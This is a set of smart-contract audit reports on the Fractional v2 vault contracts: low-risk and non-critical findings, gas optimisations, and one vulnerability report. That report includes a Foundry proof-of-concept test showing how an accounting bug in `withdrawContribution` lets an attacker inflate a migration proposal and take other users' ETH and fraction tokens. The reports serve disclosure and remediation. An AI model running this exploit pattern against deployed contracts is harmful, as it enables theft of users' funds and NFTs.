- [Low](#low)     - [**1. Packages with vulnerabilities**](#1-packages-with-vulnerabilities)     - [**2. Outdated compiler**](#2-outdated-compiler)     - [**3. Unsafe ERC20 calls**](#3-unsafe-erc20-calls)     - [**4. Lack of ACK during owner change**](#4-lack-of-ack-during-owner-change)     - [**5. Lack of nonReentrant in Buyout and Migration**](#5-lack-of-nonreentrant-in-buyout-and-migration)     - [**6. Lock ether**](#6-lock-ether)     - [**7. Complex fallback**](#7-complex-fallback) - [Non-Critical](#non-critical)     - [**8. Outdated packages**](#8-outdated-packages)     - [**9. Lack of checks**](#9-lack-of-checks)     - [**10. Open TODO**](#10-open-todo)     - [**11. Use abstract for base contracts**](#11-use-abstract-for-base-contracts)     - [**12. install allows uninstall**](#12-install-allows-uninstall)     - [**13. Contracts with functions without auth that can produce economic losses**](#13-contracts-with-functions-without-auth-that-can-produce-economic-losses)     - [**14. Improve propose method design**](#14-improve-propose-method-design)  # Low  ## **1. Packages with vulnerabilities**  The project contains packages that urgently need to be updated because they contain important vulnerabilities.  `npm audit`:  ``` 54 vulnerabilities (11 moderate, 40 high, 3 critical) ```  ## **2. Outdated compiler**  The pragma version used is:  ``` pragma solidity 0.8.13; ```  But recently solidity released a new version with important Bugfixes:  - The first one is related to ABI-encoding nested arrays directly from calldata. You can find more information [here](https://blog.soliditylang.org/2022/05/17/calldata-reencode-size-check-bug/).  - The second bug is triggered in certain inheritance structures and can cause a memory pointer to be interpreted as a calldata pointer or vice-versa. We also have a dedicated blog [post](https://blog.soliditylang.org/2022/05/17/data-location-inheritance-bug/) about this bug.  Apart from these, there are several minor bug fixes and improvements.  The minimum required version should be [0.8.14](https://github.com/ethereum/solidity/releases/tag/v0.8.14)  ## **3. Unsafe ERC20 calls**  The following code doesn't check the result of the ERC20 calls. ERC20 standard specify that the token can return false if these calls fails, so it's mandatory to check the result of these ERC20 methods.  Reference:  - [EIP-20](https://eips.ethereum.org/EIPS/eip-20) > NOTES: The following specifications use syntax from Solidity 0.4.17 (or above). Callers MUST handle false from returns (bool success). Callers MUST NOT assume that false is never returned!  Affected source code for `transfer`:  ```diff function ERC20Transfer(     address _token,     address _to,     uint256 _value ) external { -   IERC20(_token).transfer(_to, _value); +   require(IERC20(_token).transfer(_to, _value)); } ```  - [TransferReference.sol#L22](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/references/TransferReference.sol#L22) - [SafeSend.sol#L33](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/SafeSend.sol#L33)  Affected source code for `transferFrom`:  - [BaseVault.sol#L65](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L65)  ## **4. Lack of ACK during owner change**  It's possible to lose the ownership under specific circumstances.  Because an human error it's possible to set a new invalid owner. When you want to change the owner's address it's better to propose a new owner, and then accept this ownership with the new wallet.  Affected source code:  - [Vault.sol#L93](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L93) - [FERC1155.sol#L234](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L234)  ## **5. Lack of `nonReentrant` in `Buyout` and `Migration`**  **ERC1155** tokens incorporate the ability to react to a transfer using the `onERC1155Received` method on the receiver. And in the `Buyout` contract there is an alteration of the states after the call to `safeTransferFrom`, so a reentry is possible.  ```javascript IERC1155(token).safeTransferFrom(     address(this),     msg.sender,     id,     _amount,     "" ); // Updates ether balance of pool buyoutInfo[_vault].ethBalance += msg.value; ```   In the `end` method, you play with fire by sending ether after the transfer, saving the reentrancy by deleting the `buyoutInfo[_vault];`  > *Safe Transfer Rules* > To be more explicit about how the standard safeTransferFrom and safeBatchTransferFrom functions MUST operate with respect to the ERC1155TokenReceiver hook functions, a list of scenarios and rules follows.  The definition of the `burn` method of an **ERC1155** is as follows:  > A contract **MAY** skip calling the ERC1155TokenReceiver hook function(s) if the mint operation is transferring the token(s) to itself. In all other cases the ERC1155TokenReceiver rules MUST be followed as appropriate for the implementation (i.e. safe, custom and/or hybrid).  Reference:  - https://eips.ethereum.org/EIPS/eip-1155#erc-1155-token-receiver  So some implementations that follow the standard of an **ERC1155** could also trigger a reentrancy.  In the case of the `settleFractions` method of the `Migration` contract, **reentrancy is possible since the `fractionsMigrated` flag is set after minting**, which would allow the contract to be minted multiple times, however the receiver of the `ERC1155TokenReceiver` event is ` address(this)` and is considered non-exploitable.  Under all these premises, I consider that the `nonReentrant` modifier is needed in the following methods:  - [Buyout.sol#L168-L176](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L168-L176) - [Buyout.sol#L226-L235](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L226-L235) - [Buyout.sol#L221](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L221) - [Buyout.sol#L264-L270](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L264-L270) - [Migration.sol#L164-L172](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L164-L172) - [Migration.sol#L279](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L279) - [Migration.sol#L312-L325](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L312-L325)  ## **6. Lock ether**  If someone sends ether to the `Buyout` contract without using the buy/sell methods, via the `receive` method, they will be blocked forever. A similar behavior occurs in the `Migration` contract.  Affected source code:  - [Buyout.sol#L53](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L53) - [Migration.sol#L63](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L63)  ## **7. Complex `fallback`**  The fallback method iss too complex and can be denied in certain cases.  According to the `fallback` solidity (documentation](https://docs.soliditylang.org/en/develop/contracts.html#fallback-function)  > In the worst case, if a payable fallback function is also used in place of a receive function, it can only rely on 2300 gas being available (see [receive Ether function](https://docs.soliditylang.org/en/develop/contracts.html#receive-ether-function) for a brief description of the implications of this).  > In the worst case, the receive function can only rely on 2300 gas being available (for example when send or transfer is used), leaving little room to perform other operations except basic logging. The following operations will consume more gas than the 2300 gas stipend: > - Writing to storage > - Creating a contract > - Calling an external function which consumes a large amount of gas > - Sending Ether  Reference:  - https://docs.soliditylang.org/en/develop/contracts.html#fallback-function  Affected source code:  - https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L38  ----  # Non-Critical  ## **8. Outdated packages**  Some used packages are out of date, it is good practice to use the latest version of these packages:  `"@openzeppelin/contracts": "^4.6.0"`   last `4.7.0`  ## **9. Lack of checks**  Check for `address(0)` during `constructor`, otherwise it could lead to bad initialization, bad implementations, or bad admin changes.  Affected source code for `address(0)`:  - [Supply.sol#L17](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L17) - [Metadata.sol#L17](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Metadata.sol#L17) - [Minter.sol#L18](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L18) - [BaseVault.sol#L25](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L25) - [Buyout.sol#L47-L49](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L47-L49) - [Migration.sol#L58-L59](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L58-L59)  Royalty `_percentage` must be less than 100, otherwise it could result in a Denial of Service in [royaltyInfo](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L247): - [FERC1155.sol#L223](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/FERC1155.sol#L223)  ## **10. Open TODO**  The code that contains "open todos" reflects that the development is not finished and that the code can change a posteriori, prior release, with or without audit.  Affected source code:  - [MerkleBase.sol#L24](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L24)  ## **11. Use `abstract` for base contracts**  Abstract contracts are contracts that have at least one function without its implementation. **An instance of an abstract cannot be created.**  Reference:  - https://docs.soliditylang.org/en/v0.6.2/contracts.html#abstract-contracts  Affected source code:  - [Minter.sol#L12](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L12)  ## **12. `install` allows `uninstall`**  It is possible to use the method `install` for `uninstall`, and the emmited event will be different. Being able to affect the correct functioning of the dApps that consume it. You only need to specify an `address(0)` as plugin during `install`.  Affected source code:  - [Vault.sol#L73](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73)  ## **13. Contracts with functions without auth that can produce economic losses**  The `BaseVault`, `Transfer` or `TransferReference` contracts allows an attacker to steal all the tokens to the implementation it has without having any type of auth, although it is not expected to have tokens, and trying to call with a delegate call is a risk that must be known.  ```javascript function ERC20Transfer(     address _token,     address _to,     uint256 _value ) external {    IERC20(_token).transfer(_to, _value); } ```  Affected source code:  - [Transfer.sol#L13](https://github.com/code-423n4/2022-07-fractional/blob/main/src/targets/Transfer.sol#L13) - [TransferReference.sol#L17-L69](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/references/TransferReference.sol#L17-L69) - [BaseVault.sol#L53-L117](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L53-L117)  The same thing happens in the `Supply` contract with `mint` and `burn`:  ```javascript /// @notice Mints fractional tokens /// @param _to Target address /// @param _value Transfer amount function mint(address _to, uint256 _value) external {     IVaultRegistry(registry).mint(_to, _value); }  /// @notice Burns fractional tokens /// @param _from Source address /// @param _value Burn amount function burn(address _from, uint256 _value) external {     IVaultRegistry(registry).burn(_from, _value); } ```  Affected source code:  - [Supply.sol#L11](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/targets/Supply.sol#L11) - [SupplyReference.sol#L22-L31](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/references/SupplyReference.sol#L22-L31)  ## **14. Improve `propose` method design**  The `propose` method of `Migration` contract should return the `proposalId` in order to avoid human errors like the one mentioned in the *"User may lose ether due to incorrect `proposalId`*.  Affected source code:  - [Migration.sol#L72](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72) 
- [Gas](#gas)     - [**1. constants expressions are expressions, not constants**](#1-constants-expressions-are-expressions-not-constants)     - [**2. Reorder structure layout**](#2-reorder-structure-layout)     - [**3. Use calldata instead of memory**](#3-use-calldata-instead-of-memory)     - [**4. There's no need to set default values for variables**](#4-theres-no-need-to-set-default-values-for-variables)     - [**5. Don't use the length of an array for loops condition**](#5-dont-use-the-length-of-an-array-for-loops-condition)     - [**6. ++i costs less gas compared to i++ or i += 1**](#6-i-costs-less-gas-compared-to-i-or-i--1)     - [**7. Reduce the size of error messages Long revert Strings**](#7-reduce-the-size-of-error-messages-long-revert-strings)         - [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)     - [**8. Use library instead of abstract contract**](#8-use-library-instead-of-abstract-contract)     - [**9. Use inline methods**](#9-use-inline-methods)     - [**10. Gas saving using immutable**](#10-gas-saving-using-immutable)     - [**11. Improved migrateFractions logic**](#11-improved-migratefractions-logic)  -----  # Gas  ## **1. `constants` expressions are expressions, not `constants`**  Due to how constant variables are implemented (replacements at compile-time), an expression assigned to a constant variable is recomputed each time that the variable is used, which wastes some gas.  If the variable was immutable instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.  Reference:  - https://github.com/ethereum/solidity/issues/9232  Consequences: each usage of a "constant" costs ~100gas more on each access (it is still a little better than storing the result in storage, but not much..). since these are not real constants, they can't be referenced from a real constant environment (e.g. from assembly, or from another library )  Affected source code:  - [Permit.sol#L5-L17](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/constants/Permit.sol#L5-L17)  ## **2. Reorder structure layout**  The following structs could be optimized moving the position of certains values in order to save slot storages:  Put booleans types together on [IMigration.sol#L8-L33](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IMigration.sol#L8-L33)  ```diff struct Proposal {     // Start time of the migration proposal     uint256 startTime;     // Target buyout price for the migration     uint256 targetPrice;     // Total ether contributed to the migration     uint256 totalEth;     // Total fractions contributed to the migration     uint256 totalFractions;     // Module contract addresses proposed for the migration     address[] modules;     // Plugin contract addresses proposed for the migration     address[] plugins;     // Function selectors for the proposed plugins     bytes4[] selectors; +   // Old fraction supply for a given vault +   uint256 oldFractionSupply; +   // New fraction supply for a given vault that has succesfully migrated +   uint256 newFractionSupply;     // Address for the new vault to migrate to (if buyout is succesful)     address newVault;     // Boolean status to check if the propoal is active     bool isCommited; -   // Old fraction supply for a given vault -   uint256 oldFractionSupply; -   // New fraction supply for a given vault that has succesfully migrated -   uint256 newFractionSupply;     // Boolean status to check that the fractions have already been migrated     bool fractionsMigrated; } ```  ## **3. Use `calldata` instead of `memory`**  The following methods are `external` but `memory` is used for arguments.  - [IMigration.sol#L89-L162](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IMigration.sol#L89-L162) - [IModule.sol#L8-L13](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IModule.sol#L8-L13) - [IVault.sol#L43-L64](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IVault.sol#L43-L64) - [IVaultRegistry.sol#L43-L71](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/interfaces/IVaultRegistry.sol#L43-L71)   These one require to change the visibility to `external`:  - [MerkleBase.sol#L61](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L61) - [MerkleBase.sol#L73](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L73)  ## **4. There's no need to set default values for variables**  If a variable is not set/initialized, the default value is assumed (0, `false`, 0x0 ... depending on the data type). You are simply wasting gas if you directly initialize it with its default value.  Affected source code:  - [MerkleBase.sol#L51](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L51) - [BaseVault.sol#L64](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L64) - [BaseVault.sol#L83](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L83) - [BaseVault.sol#L107](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L107) - [Vault.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L78) - [Vault.sol#L104](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L104)  ## **5. Don't use the length of an array for loops condition**  It's cheaper to store the length of the array inside a local variable and iterate over it.  Affected source code:  - [MerkleBase.sol#L51](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L51) - [MerkleBase.sol#L110](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L110) - [BaseVault.sol#L64](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L64) - [BaseVault.sol#L83](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L83) - [BaseVault.sol#L107](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L107) - [BaseVault.sol#L130-L132](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L130-L132) - [Buyout.sol#L454](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L454)  ## **6. `++i` costs less gas compared to `i++` or `i += 1`**  `++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.  `i++` increments `i` and returns the initial value of `i`. Which means:  ```solidity uint i = 1; i++; // == 1 but i == 2 ```  But `++i` returns the actual incremented value:  ```solidity uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable ```  In the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2` I suggest using `++i` instead of `i++` to increment the value of an uint variable. Same thing for `--i` and `i--`  Affected source code:  - [Vault.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L78) - [Vault.sol#L104](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L104)  ## **7. Reduce the size of error messages (Long revert Strings)**  Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.  Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.  I suggest shortening the revert strings to fit in 32 bytes, or that using custom errors as described next (require pragma upgrade).  ### Use Custom Errors instead of Revert Strings to save Gas  Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)  Source Custom Errors in Solidity:  Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., revert("Insufficient funds.");), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.  Custom errors are defined using the error statement, which can be used inside and outside of contracts (including interfaces and libraries).  Affected source code:  - [MerkleBase.sol#L62](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L62) - [MerkleBase.sol#L78](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L78)  ## **8. Use `library` instead of `abstract` contract**  If the following contracts were libraries, they could save gas thanks to compiler optimizations since there are functions that are not called and being an abstract contract implies publishing all the code marked as public, such as library, the compiler can choose which functions to eliminate by not be used.  Smaller contracts would be produced, with less inheritance and therefore more auditable and readable.  Affected source code:  - [MerkleBase.sol](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/MerkleBase.sol#L7)  ## **9. Use inline methods**  The following methods can be moved to inline calls without greatly affecting readability, this will increase the performance of the contract.  Affected source code:  - [Multicall.sol#L39](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/utils/Multicall.sol#L39)  ## **10. Gas saving using `immutable`**  It's possible to avoid storage access a save gas using `immutable` keyword for the following variables:  It's also better to remove the initial values, because they will be set during the constructor.  Affected source code:  - [BaseVault.sol#L19](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L19) - [Minter.sol#L14](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Minter.sol#L14) - [VaultFactory.sol#L15](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L15) - [Buyout.sol#L29-L33](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L29-L33) - [Migration.sol#L37-L39](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L37-L39)  ## **11. Improved `migrateFractions` logic**  [migrateFractions](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L438-L449) method could be optimized as follows:  ```diff -       (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo( +       (, address proposer, State current, , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(             _vault         );         State required = State.SUCCESS;         if (current != required) revert IBuyout.InvalidState(required, current);         // Reverts if proposer of buyout is not this contract         if (proposer != address(this)) revert NotProposalBuyout(); - -       // Gets the last total supply of fractions for the vault -       (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo( -           _vault -       ); ```  **There is no need to duplicate the call of `buyoutInfo(_vault)`** 
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L292   # Vulnerability details  ## Impact Steal NFTs from a Vault, and ETH + Fractional tokens from users.  ## Description  The `Migration.sol` module expects users to join a proposal using the `join` function, and leave a proposal using the `leave` function, both functions update fraction and ether balances of the proposal *and* the caller.  The `withdrawContribution` function is meant to be used to retrieve ether and fractions deposited from an unsuccessful migration, but it can be called as well in proposals that have not been commited.  Unfortunately, the `withdrawContribution` function will issue a refund on fraction tokens and ether balances the user sent to a proposal but it will not update the variables `totalEth` and `totalFractions` (as `join` and `leave` do), leading to an inflation of ETH and fractional tokens if the user calls `join`, `withdrawContribution` and `join` again.  Exploiting this inflation bug, an attacker can steal all Ether and fractional tokens sent to a legit proposal by legit users of the community, and redirect them to an evil proposal that will win (because it has over 51% of token supply) and at the same time invalidate the legit proposal due to:  1- Lack of funds (they were stolen).  2- Only 1 LIVE proposal can be running at the same time.  A key element to take note is that only 1 proposal can be `LIVE`, but before a proposal goes `LIVE`, many can be created at the same time, and users can join those that resonate with them, sending their ETH and fractional tokens to support it. The vault will have a big amount of ETH and fractional tokens in these situations.  ## Steps to reproduce An attacker's will exploit the inflation bug as follow:  1- Wait until there's at least 50% of the total supply of fractional tokens in the vault, being stacked into one or several proposals.  2- Create an evil proposal with evil modules and inflate the amount of ETH and fractional tokens in your proposal up to the exact amount of the total ETH and fractional tokens in the vault.  3- Commit your proposal. That will send all ETH and fractional tokens in the vault to your proposal and `start` it.  Now that your proposal has over 51% total supply of fractional tokens in it and a lot of ETH stolen from members of the vault, many creative things can be done, including taking over the Vault's NFTs with an evil module once the proposal goes through.  **NOTE: In the `REJECTION_PERIOD` victims can buy tokens to try to stop the proposal from going through, but the price of every tokens is calculated using the `depositAmount` and `msg.value` (https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L86) both values manipulated by the attacker. **   ## Proof of Concept The proof of concept took 4 hours and 33 mins to be written, as I tried hard to get a clean, and easy to understand and reproduce PoC that illustrates the impact of the attack.  Everything was put inside a function filled with comments at every stage, that can be included within the Unit Tests of the project.  You can read the PoC or include the function in `test/Migration.t.sol` and call `forge test -vvv --match-test testProposalAttack` to execute it.   ```     function testProposalAttack() public {         initializeMigration(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY, true);         (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();         address[] memory modules = new address[](1);         modules[0] = address(mockModule);          // STEP 0         // The attacker waits until a proposal with over 51% joins and a nice amount of ETH is made          // STEP 1         // Alice makes a legit proposal         alice.migrationModule.propose(             vault,             modules,             nftReceiverPlugins,             nftReceiverSelectors,             TOTAL_SUPPLY * 2,             1 ether         );          // STEP 3         // Alice joins his proposal with 50 ETH and 5,000 tokens out of a total supply of 10,000         alice.migrationModule.join{value: 50 ether}(vault, 1, 5000);          // NOTE: In a real world scenario, several members will join Alice's legit proposal with their own ETH and tokens,         // but to make this PoC easier to read, instead of creating several fake accounts,         // let's have just Alice join his own proposal with 50% of token supply.          // STEP 4         // Bob makes an evil proposal, with evil modules to steal the vault's NFTs         bob.migrationModule.propose(             vault,             modules,             nftReceiverPlugins,             nftReceiverSelectors,             TOTAL_SUPPLY,             1 ether         );          // STEP 5         // Bob joins and then withdraws from the proposal in loop, to inflate the ETH of his proposal         // and total locked tokens (thanks to a bug in the `withdrawContribution` function)         bob.migrationModule.join{value: 10 ether}(vault, 2, 25);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 25);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 25);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 24);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 101);           // Let's do some accounting...         (,,uint256 totalEth_AliceProposal,,,,,,) = migrationModule.migrationInfo(vault,1);         (,,uint256 totalEth_BobProposal,uint256 _totalFractions,,,,,) = migrationModule.migrationInfo(vault,2);          // Alice proposal has 50 ETH.         assertEq(totalEth_AliceProposal, 50000000000000000000);          // Bob's proposal has 50 ETH.         assertEq(totalEth_BobProposal, 50000000000000000000);          // He only put 10 ETH, but it shows 50 ETH because         // we inflate it by exploiting the bug.          // We can keep inflating it indefinitely to get any ETH         // amount desired (up to the max ETH balance of the smart contract).          // NOTE that the very REAL ETH Balance of the vault is only the 50 ETH (from Alice) + 10 ETH (from Bob) = 60 ETH.          // We'll steal those 50 ETH from alice and all of his fractional tokens, to add them to our proposal now.          // STEP 6         // Bob calls commit to kickoff the buyout process         bool started = bob.migrationModule.commit(vault, 2);         assertTrue(started);          // Final accounting:         // Buyout now has 5,100 Fraction tokens from a total supply of 10,000 (that's 51% of total supply,         // exactly what is required to win a proposal)         assertEq(getFractionBalance(buyout), 5101);          // and 50 ETH from Alice's proposal         assertEq(getETHBalance(buyout), 50 ether);          // Bob started with 100 ether and at this time it has 90 ether, as we only spent 10 ether         assertEq(getETHBalance(bob.addr), 90 ether);          // Bob only sent 101 tokens from his own fraction balance to his evil proposal, the rest were stolen         // from Alice's proposal         assertEq(getFractionBalance(bob.addr), 4899);          // Next steps are straight forward, you can get creative and do many things that would make the PoC         // unnecessarily long          // Alice's proposal will revert if she tries to commit it, as only 1 proposal can be LIVE         // at the same time. Also, there's not enough ETH in the contract to commit his proposal,         // We are using all of his ETH in our own proposal.  ```  ## Tools Used Run `forge test -vvv --match-test testProposalAttack` after preparing the testing environment as explained in https://github.com/code-423n4/2022-07-fractional#prepare-environment   ## Recommended Mitigation Steps Update the `proposal.totalEth` and `proposal.totalFractions` in the `withdrawContribution` function.  
#  [G-01] State variables only set in the constructor should be declared `immutable`:-        1. File: j2022-07-fractional/src/Vault.sol (line 12-17):            `    /// @notice Address of vault owner     address public owner;     /// @notice Merkle root hash of vault permissions     bytes32 public merkleRoot;     /// @notice Initializer value     uint256 public nonce;`        2. File: 2022-07-fractional/src/VaultFactory.sol (line 15):            `address public implementation;`                  3. File: 2022-07-fractional/src/modules/Buyout.sol (line 29-33):            `    address public registry;     /// @notice Address of Supply target contract     address public supply;     /// @notice Address of Transfer target contract     address public transfer;`        4. File: 2022-07-fractional/src/modules/Migration.sol (line 36-41):            `    /// @notice Address of Buyout module contract     address payable public buyout;     /// @notice Address of VaultRegistry contract     address public registry;     /// @notice Counter used to assign IDs to new proposals     uint256 public nextId;`                  5. File: 2022-07-fractional/src/modules/Minter.sol (line 14):            `address public supply;`         6. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 19):            `address public registry;`        7. File: 2022-07-fractional/src/VaultFactory.sol (line 15):            `address public implementation;`               #  [G-02] `x = x + y` is cheaper than `x += y`:-        1. File: 2022-07-fractional/src/FERC1155.sol (line 62):            `totalSupply[_id] -= _amount;`        2. File: 2022-07-fractional/src/FERC1155.sol (line 270):            `balanceOf[_from][_id] -= _amount;`                  3. File: 2022-07-fractional/src/modules/Buyout.sol (line 139):            `buyoutInfo[_vault].ethBalance -= ethAmount;`        4. File: 2022-07-fractional/src/modules/Migration.sol (line 156):            `proposal.totalFractions -= amount;`                  